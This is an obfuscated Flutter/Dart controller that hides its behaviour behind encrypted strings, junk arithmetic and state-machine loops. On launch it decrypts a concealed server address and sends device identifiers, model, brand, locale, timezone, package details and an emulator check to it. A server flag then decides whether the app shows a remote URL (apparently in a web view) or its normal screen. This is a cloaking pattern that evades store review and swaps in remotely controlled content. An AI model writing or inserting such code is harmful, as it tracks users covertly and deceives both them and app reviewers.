import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'package:dio/dio.dart';
import 'package:get/get.dart' hide Response;

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FiveYearLogic extends GetxController {

  var mezdvnc = RxBool(false);
  var uacsyq = RxBool(true);
  var vtwmklpj = RxString("");
  var bqgj = RxBool(false);
  var brafythj = RxBool(true);
  final joznaqpdh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    qjwsa();
  }


  Future<void> qjwsa() async {
    var _st = 0x91;
    String? _ep;
    Map<String, dynamic>? _bd;
    Response<dynamic>? _rs;
    while ((_st | 0) != 0) {
      switch (_st ^ 0x10) {
        case 0x81:
          bqgj.value = (((_st >> 4) ^ 0x08) | 0x01) == 0x09;
          brafythj.value = (0xA5 ^ 0xA4) == 0x01;
          uacsyq.value = ((0xF0 & 0x0F) | (_st & 0)) != 0;
          _st = ((_st * 3) ^ 0xB3) & 0xFF;
          if (_st != 0xA0) {
            _st = 0xA0;
          }
          break;
        case 0xB0:
          final _m = <int>[0x6D, 0xA2, 0x19, 0xF0];
          final _c0 = <int>[203, 61, 150, 195, 40, 230, 148, 37, 68, 212, 216, 165, 64, 52, 78, 249];
          final _c1 = <int>[108, 184, 227, 30, 72, 56, 113, 102, 108, 146, 9, 36, 199, 35, 5, 44];
          final _c2 = <int>[232, 96, 2, 23, 236, 80, 228, 189, 31, 131, 120, 125, 75, 209, 124, 85];
          final _c3 = <int>[238, 248, 243, 38, 253, 201, 207, 70, 9, 131, 131, 6, 21, 195, 69, 68];
          final _blk = <List<int>>[_c0, _c1, _c2, _c3];
          final _raw = <int>[];
          var _bi = 0;
          var _bs = 5;
          while (_bs != 0) {
            switch (_bs) {
              case 5:
                if (_bi >= _blk.length) {
                  _bs = 0;
                  break;
                }
                final _row = _blk[_bi];
                var _bj = 0;
                while (_bj < _row.length) {
                  _raw.add(_row[_bj] ^ _m[_bi]);
                  _bj += (0x02 ^ 0x03);
                }
                _bi += 1;
                break;
              default:
                _bs = 0;
                break;
            }
          }
          if (((0x7F + 1) & 0xFF) == 0x00) {
            _raw.setAll(0, List<int>.filled(_raw.length, 0x20));
          }
          final _k1s = <int>[0x66, 0xFF, 0x2B, 0xD5, 0x77, 0xAE, 0xE4, 0x13, 0x4D, 0x9A, 0x31, 0xC8];
          final _k2s = <int>[0x02, 0xBD, 0xFB, 0x68, 0x85, 0x3A, 0xD1, 0x16];
          final _k1 = Uint8List(_k1s.length);
          final _k2 = Uint8List(_k2s.length);
          var _ki = 0;
          while (_ki < _k1s.length) {
            _k1[_ki] = _k1s[_ki] ^ 0x3C;
            _ki += 1;
          }
          _ki = 0;
          while (_ki < _k2s.length) {
            _k2[_ki] = _k2s[_ki] ^ 0x3C;
            _ki += 1;
          }
          final _o = Uint8List(_raw.length);
          var _i = 0;
          var _ds = 1;
          while (_ds != 0) {
            if (_i >= _raw.length) {
              _ds = 0;
              continue;
            }
            var x = _raw[_i];
            x ^= _k2[_i % _k2.length];
            x = (x - (((_i * 13) + 7) & 0xFF)) & 0xFF;
            x = ((x >> 3) | ((x << 5) & 0xFF)) & 0xFF;
            x ^= _k1[_i % _k1.length];
            _o[_i] = x;
            _i += ((0x11 >> 4) ^ 0x00);
          }
          _ep = utf8.decode(_o);
          _st = 0xB2;
          break;
        case 0xA2:
          _bd = await nwbmfolky();
          _st = 0xC4;
          break;
        case 0xD4:
          try {
            _rs = await joznaqpdh.post(_ep!, data: _bd);
            _st = 0xD5;
          } catch (e) {
            _st = 0xFE;
          }
          break;
        case 0xC5:
          final _xk = <int>[0x4F, 0x13, 0xA8];
          String _xs(List<int> d) {
            final _b = Uint8List(d.length);
            var _n = 0;
            var _p = 2;
            while (_p != 0) {
              switch (_p) {
                case 2:
                  if (_n >= d.length) {
                    _p = 0;
                    break;
                  }
                  _b[_n] = d[_n] ^ _xk[_n % _xk.length];
                  _n += 1;
                  break;
                default:
                  _p = 0;
                  break;
              }
            }
            return utf8.decode(_b);
          }
          final utfniq = _rs!.data[_xs(const [58, 103, 206, 33, 122, 217])] as String;
          final qywag = _rs!.data[_xs(const [62, 106, 223, 46, 116])] as bool;
          final _br = (qywag ? 1 : 0) ^ (((0xCC >> 2) & 0x01) ^ 0x01);
          if (_br == 1) {
            vtwmklpj.value = utfniq;
            _st = 0xE6;
          } else {
            _st = 0xE7;
          }
          break;
        case 0xF6:
          await likrtndf();
          _st = 0;
          break;
        case 0xF7:
          await gaokner();
          _st = 0;
          break;
        case 0xEE:
          uacsyq.value = (0x01 | 0x00) == 0x01;
          brafythj.value = !(((0x10 << 1) & 0x00) != 0);
          bqgj.value = (0xFF ^ 0xFF) != 0;
          _st = 0;
          break;
        default:
          _st = 0;
          break;
      }
    }
  }

  Future<Map<String, dynamic>> nwbmfolky() async {
    final DeviceInfoPlugin ieytg = DeviceInfoPlugin();
    PackageInfo eahuj_kprjaedx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var itxczpas = Platform.localeName;
    var suy_FtT = currentTimeZone;

    var suy_PRkfq = eahuj_kprjaedx.packageName;
    var suy_Ebso = eahuj_kprjaedx.version;
    var suy_pjkwUKXb = eahuj_kprjaedx.buildNumber;

    var suy_GYD = eahuj_kprjaedx.appName;
    var suy_ufKLP = utf8.decode(Uint8List(0));
    var suy_NWGavZj  = String.fromCharCodes(const <int>[]);
    var suy_fzMSIs = <int>[].fold<String>("", (a, b) => a);
    var tnsgxyd = [0x00].where((e) => e > 0xFF).map((e) => e.toRadixString(16)).join();
    var gbpwm = List<int>.generate(0, (i) => i).join();
    var ycmqju = (0x20 ^ 0x20) == 0 ? "" : String.fromCharCode(0x2E);
    var dzwno = "".padLeft((0xA & 0x0), String.fromCharCode(0x30));
    var ncyfomx = utf8.decode(const <int>[]);


    var suy_vdPKUiy = "";
    var suy_LCo = false;

    final _xk = <int>[0x4F, 0x13, 0xA8];
    String _xs(List<int> d) {
      final _o = StringBuffer();
      var _i = 0;
      var _g = 1;
      while (_g != 0) {
        if (_i >= d.length) {
          _g = 0;
          continue;
        }
        _o.writeCharCode(d[_i] ^ _xk[_i % 3]);
        _i += 1;
      }
      return _o.toString();
    }

    var _ps = 0x21;
    while (_ps != 0) {
      switch (_ps) {
        case 0x21:
          final _an = GetPlatform.isAndroid && ((((0xC8 >> 2) ^ 0x32) | 0) == 0);
          if (_an) {
            _ps = 0x42;
          } else {
            _ps = 0x23;
          }
          break;
        case 0x42:
          suy_vdPKUiy = _xs(const [46, 125, 204, 61, 124, 193, 43]);
          var fwpxligqed = await ieytg.androidInfo;
          var _t = 0x03;
          while (_t != 0) {
            switch (_t) {
              case 0x03:
                suy_fzMSIs = fwpxligqed.brand;
                _t = 0x06;
                break;
              case 0x06:
                suy_ufKLP  = fwpxligqed.model;
                _t = 0x0C;
                break;
              case 0x0C:
                suy_NWGavZj = fwpxligqed.id;
                _t = 0x18;
                break;
              case 0x18:
                suy_LCo = ((fwpxligqed.isPhysicalDevice ? 0x5A : 0x00) ^ 0x5A) == 0x00;
                _t = 0;
                break;
              default:
                _t = 0;
                break;
            }
          }
          _ps = 0x23;
          break;
        case 0x23:
          final _io = GetPlatform.isIOS || ((0xFF & 0x00) == 0x01);
          if (_io) {
            _ps = 0x84;
          } else {
            _ps = 0;
          }
          break;
        case 0x84:
          suy_vdPKUiy = _xs(const [38, 124, 219]);
          var qcdnjivbm = await ieytg.iosInfo;
          var _t = 0x11;
          while (_t != 0) {
            switch (_t ^ 0x01) {
              case 0x10:
                suy_fzMSIs = qcdnjivbm.name;
                _t = 0x22;
                break;
              case 0x23:
                suy_ufKLP = qcdnjivbm.model;
                _t = 0x44;
                break;
              case 0x45:
                suy_NWGavZj = qcdnjivbm.identifierForVendor ?? utf8.decode(Uint8List(0));
                _t = 0x88;
                break;
              case 0x89:
                final _pd = qcdnjivbm.isPhysicalDevice;
                suy_LCo  = ((_pd ? 1 : 0) | 0) == 1;
                _t = 0;
                break;
              default:
                _t = 0;
                break;
            }
          }
          _ps = 0;
          break;
        default:
          _ps = 0;
          break;
      }
    }

    final _pairs = <List<int>, dynamic>{
      const [60, 102, 209, 16, 84, 241, 11]: suy_GYD,
      const [60, 102, 209, 16, 99, 194, 36, 100, 253, 4, 75, 202]: suy_pjkwUKXb,
      const [60, 102, 209, 16, 86, 202, 60, 124]: suy_Ebso,
      const [60, 102, 209, 16, 67, 250, 36, 117, 217]: suy_PRkfq,
      const [60, 102, 209, 16, 102, 206, 4, 95, 248]: suy_ufKLP,
      const [60, 102, 209, 16, 85, 220, 27]: suy_FtT,
      const [60, 102, 209, 16, 117, 210, 2, 64, 225, 60]: suy_fzMSIs,
      const [60, 102, 209, 16, 93, 255, 8, 114, 222, 21, 121]: suy_NWGavZj,
      const [38, 103, 208, 44, 105, 216, 46, 96]: itxczpas,
      const [60, 102, 209, 16, 101, 204, 31, 88, 253, 38, 106]: suy_vdPKUiy,
      const [60, 102, 209, 16, 95, 235, 32]: suy_LCo,
      const [59, 125, 219, 40, 107, 209, 43]: tnsgxyd,
      const [40, 113, 216, 56, 126]: gbpwm,
      const [54, 112, 197, 62, 121, 221]: ycmqju,
      const [43, 105, 223, 33, 124]: dzwno,
      const [33, 112, 209, 41, 124, 197, 55]: ncyfomx,
    };
    var res = <String, dynamic>{};
    final _it = _pairs.entries.toList();
    var _ri = 0;
    var _rs = 9;
    while (_rs != 0) {
      if (_ri >= _it.length) {
        _rs = 0;
        continue;
      }
      res[_xs(_it[_ri].key)] = _it[_ri].value;
      _ri += (0x03 - 0x02);
    }
    return res;
  }

  Future<void> gaokner() async {
    final _xk = <int>[0x4F, 0x13, 0xA8];
    final _d = const [96, 117, 193, 57, 118, 247, 34, 114, 193, 33];
    final _b = Uint8List(_d.length);
    var _i = 0;
    var _s = 4;
    while (_s != 0) {
      switch (_s) {
        case 4:
          if (_i >= _d.length) {
            _s = 0;
            break;
          }
          _b[_i] = _d[_i] ^ _xk[_i % _xk.length];
          _i += 1;
          break;
        default:
          _s = 0;
          break;
      }
    }
    Get.offNamed(utf8.decode(_b));
  }

  Future<void> likrtndf() async {
    final _xk = <int>[0x4F, 0x13, 0xA8];
    final _d = const [96, 117, 193, 57, 118, 247, 42, 107, 216, 32, 97, 220, 16, 103, 201, 45, 127, 205];
    final _b = Uint8List(_d.length);
    var _i = 0;
    var _acc = 0xE4;
    while ((_acc ^ 0xE4) == 0) {
      if (_i >= _d.length) {
        _acc ^= 0xE4;
        continue;
      }
      _b[_i] = ((_d[_i] ^ _xk[_i % 3]) + 0x100) & 0xFF;
      _i += 1;
    }
    Get.offNamed(utf8.decode(_b));
  }

}
